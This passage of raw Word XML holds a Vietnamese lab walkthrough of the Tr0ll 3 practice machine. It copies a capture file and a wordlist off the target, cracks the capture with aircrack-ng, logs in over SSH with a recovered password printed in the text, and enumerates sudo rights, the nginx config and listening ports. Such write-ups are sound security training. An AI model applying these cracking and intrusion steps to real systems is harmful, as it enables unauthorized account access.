        <w:t xml:space="preserve">Mục đích: </w:t>
      </w:r>
      <w:r>
        <w:t>Tải file wytshadow.cap từ máy mục tiêu về Kali.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F891AA8" w14:textId="77777777" w:rsidR="00854BD8" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Lệnh thực thi:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09D07FD8" w14:textId="56816516" w:rsidR="00854BD8" w:rsidRDefault="00000000">
      <w:pPr>
        <w:ind w:left="397"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t xml:space="preserve">scp </w:t>
      </w:r>
      <w:r w:rsidR="00DA4299">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t>start@</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t>192.168.56.1</w:t>
      </w:r>
      <w:r w:rsidR="0072187C">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t>16</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t>:/var/log/.dist-manage/wytshadow.cap .</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EC528A9" w14:textId="77777777" w:rsidR="00854BD8" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Giải thích: </w:t>
      </w:r>
      <w:r>
        <w:t>SCP sao chép file bắt gói từ thư mục ẩn trên máy mục tiêu về thư mục hiện tại. Thay địa chỉ IP bằng IP thực tế của máy Tr0ll 3 khi cần.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C33F2D0" w14:textId="77777777" w:rsidR="00854BD8" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Mục đích: </w:t>
      </w:r>
      <w:r>
        <w:t>Tải file gold_star.txt dùng làm wordlist.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FF6F312" w14:textId="77777777" w:rsidR="00854BD8" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Lệnh thực thi:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FD7EDC1" w14:textId="3D0FDC4D" w:rsidR="00854BD8" w:rsidRDefault="00000000">
      <w:pPr>
        <w:ind w:left="397"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t xml:space="preserve">scp </w:t>
      </w:r>
      <w:r w:rsidR="00DA4299">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t>start@192.168.56.1</w:t>
      </w:r>
      <w:r w:rsidR="0072187C">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t>16</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t>:/.hints/lol/rofl/roflmao/this/isnt/gonna/stop/anytime/soon/still/going/lol/annoyed/almost/there/jk/no/seriously/last/one/rofl</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>/ok/ill/stop/however/this/is/fun/ok/here/rofl/sorry/you/made/it/gold_star.txt .</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39C8D463" w14:textId="77777777" w:rsidR="00854BD8" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Giải thích: </w:t>
      </w:r>
      <w:r>
        <w:t>Lệnh sao chép file gold_star.txt nằm trong cây thư mục .hints về Kali để sử dụng cho bước phân tích file capture.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B20E42A" w14:textId="77777777" w:rsidR="00DA4299" w:rsidRDefault="00DA4299">
      <w:pPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="0A90B2B0" wp14:editId="463BB4DF">
            <wp:extent cx="6152515" cy="875030"/>
            <wp:effectExtent l="0" t="0" r="635" b="1270"/>
            <wp:docPr id="10636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106" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId15"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6152515" cy="875030"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C3994C5" w14:textId="4EDD94A1" w:rsidR="00920C3A" w:rsidRDefault="00920C3A">
      <w:pPr>
        <w:rPr>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00920C3A">
        <w:rPr>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">Thực hiện phân tích file bắt gói wytshadow.cap bằng công cụ </w:t>
      </w:r>
      <w:r w:rsidR="003659E7" w:rsidRPr="003659E7">
        <w:rPr>
          <w:bCs/>
        </w:rPr>
        <w:t>tshark</w:t>
      </w:r>
      <w:r w:rsidRPr="00920C3A">
        <w:rPr>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> để kiểm tra nội dung lưu lượng mạng và tìm kiếm các thông tin nhạy cảm được truyền dưới dạng văn bản rõ.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7362BD7F" w14:textId="77777777" w:rsidR="00920C3A" w:rsidRDefault="00920C3A" w:rsidP="00920C3A">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Lệnh thực thi:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DBA234F" w14:textId="129DA17F" w:rsidR="003659E7" w:rsidRPr="00920C3A" w:rsidRDefault="003659E7">
      <w:pPr>
        <w:rPr>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003659E7">
        <w:rPr>
          <w:bCs/>
          <w:color w:val="EE0000"/>
        </w:rPr>
        <w:t>tshark -r wytshadow.cap -V | less</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="1C14D565" wp14:editId="06461362">
            <wp:extent cx="6152515" cy="3568700"/>
            <wp:effectExtent l="0" t="0" r="635" b="0"/>
            <wp:docPr id="58936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203" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId16"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6152515" cy="3568700"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="60696BDE" w14:textId="7B9696B7" w:rsidR="00854BD8" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Mục đích: </w:t>
      </w:r>
      <w:r>
        <w:t>Thử wordlist với file capture để khôi phục thông tin xác thực.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="475C09C7" w14:textId="77777777" w:rsidR="00854BD8" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Lệnh thực thi:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30EFE0E0" w14:textId="77777777" w:rsidR="00854BD8" w:rsidRDefault="00000000">
      <w:pPr>
        <w:ind w:left="397"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t>aircrack-ng -w gold_star.txt wytshadow.cap</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D92B315" w14:textId="77777777" w:rsidR="00854BD8" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Giải thích: </w:t>
      </w:r>
      <w:r>
        <w:t>Aircrack-ng đọc danh sách từ trong gold_star.txt và thử với dữ liệu trong wytshadow.cap. Kết quả cung cấp thông tin cần thiết để truy cập tài khoản wytshadow.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A958543" w14:textId="713CF95A" w:rsidR="00854BD8" w:rsidRDefault="00B405A0">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="4B36E336" wp14:editId="334C080C">
            <wp:extent cx="6152515" cy="2672080"/>
            <wp:effectExtent l="0" t="0" r="635" b="0"/>
            <wp:docPr id="201309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90630" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId17"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6152515" cy="2672080"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
      <w:r w:rsidR="00000000">
        <w:rPr>
          <w:b/>
          <w:sz w:val="30"/>
        </w:rPr>
        <w:t>4. Truy cập tài khoản wytshadow và dịch vụ nội bộ</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65264A75" w14:textId="5E2CED15" w:rsidR="00854BD8" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Mục đích: </w:t>
      </w:r>
      <w:r>
        <w:t>Đăng nhập bằng tài khoản wytshadow.</w:t>
      </w:r>
      <w:r w:rsidR="00143640" w:rsidRPr="00143640">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00143640">
        <w:t xml:space="preserve">Pass: </w:t>
      </w:r>
      <w:r w:rsidR="00143640" w:rsidRPr="00143640">
        <w:rPr>
          <w:color w:val="EE0000"/>
        </w:rPr>
        <w:t>gaUoCe34t1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="090352A8" w14:textId="77777777" w:rsidR="00854BD8" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Lệnh thực thi:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F86BCF0" w14:textId="373B15BC" w:rsidR="00854BD8" w:rsidRDefault="00000000">
      <w:pPr>
        <w:ind w:left="397"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t>ssh wytshadow@192.168.56.1</w:t>
      </w:r>
      <w:r w:rsidR="0072187C">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t>16</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F0B2F15" w14:textId="77777777" w:rsidR="00854BD8" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Giải thích: </w:t>
      </w:r>
      <w:r>
        <w:t>Sử dụng thông tin xác thực thu được từ bước phân tích capture để đăng nhập vào máy mục tiêu.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="357F3205" w14:textId="7E3EAC47" w:rsidR="00854BD8" w:rsidRDefault="00143640">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="45642192" wp14:editId="414854DA">
            <wp:extent cx="6152515" cy="1503045"/>
            <wp:effectExtent l="0" t="0" r="635" b="1905"/>
            <wp:docPr id="85730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03123" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId18"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6152515" cy="1503045"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
      <w:r w:rsidR="00000000">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Mục đích: </w:t>
      </w:r>
      <w:r w:rsidR="00000000">
        <w:t>Thực thi file oohfun và quan sát hệ thống.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BAEC5C0" w14:textId="77777777" w:rsidR="00854BD8" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Lệnh thực thi:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2AE55215" w14:textId="77777777" w:rsidR="00854BD8" w:rsidRDefault="00000000">
      <w:pPr>
        <w:ind w:left="397"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t>./oohfun</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A8AC8DF" w14:textId="77777777" w:rsidR="00854BD8" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Giải thích: </w:t>
      </w:r>
      <w:r>
        <w:t>Chạy file thực thi oohfun theo đúng tiến trình bài lab. Sau đó kiểm tra các cổng và tiến trình mạng để phát hiện dịch vụ mới hoặc dịch vụ chỉ lắng nghe nội bộ.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DF00EBC" w14:textId="77777777" w:rsidR="00143640" w:rsidRDefault="00143640">
      <w:pPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="01758068" wp14:editId="3A490757">
            <wp:extent cx="6152515" cy="3128645"/>
            <wp:effectExtent l="0" t="0" r="635" b="0"/>
            <wp:docPr id="149750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02399" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId19"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6152515" cy="3128645"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F67BE7C" w14:textId="4092C92D" w:rsidR="00143640" w:rsidRDefault="00143640">
      <w:pPr>
        <w:rPr>
          <w:bCs/>
          <w:color w:val="EE0000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00143640">
        <w:rPr>
          <w:bCs/>
        </w:rPr>
        <w:t>Lệnh:</w:t>
      </w:r>
      <w:r w:rsidRPr="00143640">
        <w:rPr>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00143640">
        <w:rPr>
          <w:bCs/>
          <w:color w:val="EE0000"/>
        </w:rPr>
        <w:t>sudo -l</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1711470E" w14:textId="442D52FA" w:rsidR="00143640" w:rsidRDefault="00143640">
      <w:pPr>
        <w:rPr>
          <w:bCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00143640">
        <w:rPr>
          <w:bCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
        </w:rPr>
        <w:t>dùng để kiểm tra tài khoản hiện tại được phép chạy những lệnh nào bằng sudo.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E1A8DA7" w14:textId="18893FB2" w:rsidR="00143640" w:rsidRDefault="00143640">
      <w:pPr>
        <w:rPr>
          <w:bCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00143640">
        <w:rPr>
          <w:bCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
        </w:rPr>
        <w:t>Kết quả của m cho thấy user wytshadow được phép chạy lệnh sau với quyền root</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:bCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D9AACE2" w14:textId="77777777" w:rsidR="00143640" w:rsidRPr="00143640" w:rsidRDefault="00143640" w:rsidP="00143640">
      <w:pPr>
        <w:rPr>
          <w:bCs/>
          <w:color w:val="EE0000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00143640">
        <w:rPr>
          <w:bCs/>
          <w:color w:val="EE0000"/>
        </w:rPr>
        <w:t>/usr/sbin/service nginx start</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6ACB57E4" w14:textId="3E6FBA64" w:rsidR="00143640" w:rsidRPr="00143640" w:rsidRDefault="00143640">
      <w:pPr>
        <w:rPr>
          <w:bCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00143640">
        <w:rPr>
          <w:bCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
        </w:rPr>
        <w:t>Nghĩa là tài khoản này chỉ được phép khởi động dịch vụ Nginx bằng quyền quản trị.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28B7B58D" w14:textId="70D28F73" w:rsidR="00143640" w:rsidRDefault="00143640">
      <w:pPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="58D61521" wp14:editId="36B3FD67">
            <wp:extent cx="6152515" cy="694690"/>
            <wp:effectExtent l="0" t="0" r="635" b="0"/>
            <wp:docPr id="34633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30869" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId20"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6152515" cy="694690"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="27993D20" w14:textId="46D51733" w:rsidR="00D13AA3" w:rsidRPr="00D13AA3" w:rsidRDefault="00D13AA3" w:rsidP="00D13AA3">
      <w:pPr>
        <w:rPr>
          <w:bCs/>
          <w:color w:val="EE0000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D13AA3">
        <w:rPr>
          <w:bCs/>
          <w:color w:val="EE0000"/>
        </w:rPr>
        <w:t>sudo -l</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4903D80F" w14:textId="77E7E953" w:rsidR="00D13AA3" w:rsidRPr="00D13AA3" w:rsidRDefault="00D13AA3" w:rsidP="00D13AA3">
      <w:pPr>
        <w:rPr>
          <w:bCs/>
          <w:color w:val="EE0000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D13AA3">
        <w:rPr>
          <w:bCs/>
          <w:color w:val="EE0000"/>
        </w:rPr>
        <w:t>ls</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02EB7159" w14:textId="16EF0147" w:rsidR="00D13AA3" w:rsidRPr="00D13AA3" w:rsidRDefault="00D13AA3" w:rsidP="00D13AA3">
      <w:pPr>
        <w:rPr>
          <w:bCs/>
          <w:color w:val="EE0000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D13AA3">
        <w:rPr>
          <w:bCs/>
          <w:color w:val="EE0000"/>
        </w:rPr>
        <w:t>cd /etc/nginx</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CBB9AD3" w14:textId="6A10B876" w:rsidR="00D13AA3" w:rsidRPr="00D13AA3" w:rsidRDefault="00D13AA3" w:rsidP="00D13AA3">
      <w:pPr>
        <w:rPr>
          <w:bCs/>
          <w:color w:val="EE0000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D13AA3">
        <w:rPr>
          <w:bCs/>
          <w:color w:val="EE0000"/>
        </w:rPr>
        <w:t>ls</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2760749D" w14:textId="1E818580" w:rsidR="00D13AA3" w:rsidRPr="00D13AA3" w:rsidRDefault="00D13AA3" w:rsidP="00D13AA3">
      <w:pPr>
        <w:rPr>
          <w:bCs/>
          <w:color w:val="EE0000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D13AA3">
        <w:rPr>
          <w:bCs/>
          <w:color w:val="EE0000"/>
        </w:rPr>
        <w:t>cd sites-enabled</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="094F3F33" w14:textId="69EB31ED" w:rsidR="00D13AA3" w:rsidRPr="00D13AA3" w:rsidRDefault="00D13AA3" w:rsidP="00D13AA3">
      <w:pPr>
        <w:rPr>
          <w:bCs/>
          <w:color w:val="EE0000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D13AA3">
        <w:rPr>
          <w:bCs/>
          <w:color w:val="EE0000"/>
        </w:rPr>
        <w:t>ls</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B7E6040" w14:textId="403831A3" w:rsidR="00D13AA3" w:rsidRDefault="00D13AA3" w:rsidP="00D13AA3">
      <w:pPr>
        <w:rPr>
          <w:bCs/>
          <w:color w:val="EE0000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D13AA3">
        <w:rPr>
          <w:bCs/>
          <w:color w:val="EE0000"/>
        </w:rPr>
        <w:t>cat default</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06CE5AB3" w14:textId="46F6D3E5" w:rsidR="00D13AA3" w:rsidRPr="00D13AA3" w:rsidRDefault="00D13AA3" w:rsidP="00D13AA3">
      <w:pPr>
        <w:rPr>
          <w:bCs/>
          <w:color w:val="EE0000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D13AA3">
        <w:rPr>
          <w:bCs/>
        </w:rPr>
        <w:t>Kết quả kiểm tra file cấu hình Nginx cho thấy dịch vụ web được cấu hình chạy trên cổng 8080, sử dụng thư mục gốc /var/nginx/www và chỉ cho phép các yêu cầu có User-Agent là Lynx; các User-Agent khác sẽ nhận phản hồi 403 Forbidden</w:t>
      </w:r>
      <w:r w:rsidRPr="00D13AA3">
        <w:rPr>
          <w:bCs/>
          <w:color w:val="EE0000"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="122B3CA4" w14:textId="47B5DC73" w:rsidR="00D13AA3" w:rsidRDefault="00D13AA3">
      <w:pPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="26D6FF38" wp14:editId="4D11FD19">
            <wp:extent cx="6152515" cy="3129915"/>
            <wp:effectExtent l="0" t="0" r="635" b="0"/>
            <wp:docPr id="151105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6252" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId21"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6152515" cy="3129915"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="79DF04F7" w14:textId="4D71FB04" w:rsidR="00854BD8" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Mục đích: </w:t>
      </w:r>
      <w:r>
        <w:t>Liệt kê các kết nối và cổng đang lắng nghe.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BCE6965" w14:textId="77777777" w:rsidR="00854BD8" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Lệnh thực thi:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38AE36A9" w14:textId="77777777" w:rsidR="00854BD8" w:rsidRDefault="00000000">
      <w:pPr>
        <w:ind w:left="397"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t>netstat -antp</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E73CBB0" w14:textId="77777777" w:rsidR="00854BD8" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Giải thích: </w:t>
      </w:r>
      <w:r>
        <w:t>Lệnh hiển thị các kết nối TCP, địa chỉ, cổng và tiến trình liên quan. Từ kết quả có thể phát hiện dịch vụ web nội bộ tại cổng 8080.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F34E655" w14:textId="158BD422" w:rsidR="00854BD8" w:rsidRDefault="00D13AA3">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="3055C723" wp14:editId="7B1EE30D">
            <wp:extent cx="6152515" cy="1560195"/>
            <wp:effectExtent l="0" t="0" r="635" b="1905"/>
            <wp:docPr id="10084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60514" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId22"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6152515" cy="1560195"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
      <w:r w:rsidR="00000000">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Mục đích: </w:t>
      </w:r>
